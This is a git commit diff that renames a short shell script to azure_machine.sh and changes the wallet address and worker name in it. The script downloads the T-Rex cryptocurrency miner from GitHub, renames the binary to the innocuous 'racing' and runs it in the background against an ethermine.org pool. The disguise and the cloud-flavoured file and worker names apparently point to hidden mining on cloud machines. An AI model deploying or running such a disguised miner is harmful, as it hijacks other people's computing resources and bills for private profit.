efe0d287f3528c6585be4974d73a411c46ac25d9
thuc96finance <99269670+thuc96finance@users.noreply.github.com>
2022-02-09 08:56:27 +0700

    Update and rename ml.sh to azure_machine.sh

--- azure_machine.sh
+++ azure_machine.sh
@@ -1,4 +1,4 @@
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x85c6aa49d2723b03ff8d81177669500ec7cdde5a -p x -w fuckboy &
+./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x575aD1F3f6C5493fB4EC2969A1701916927A23df -p x -w lambda &
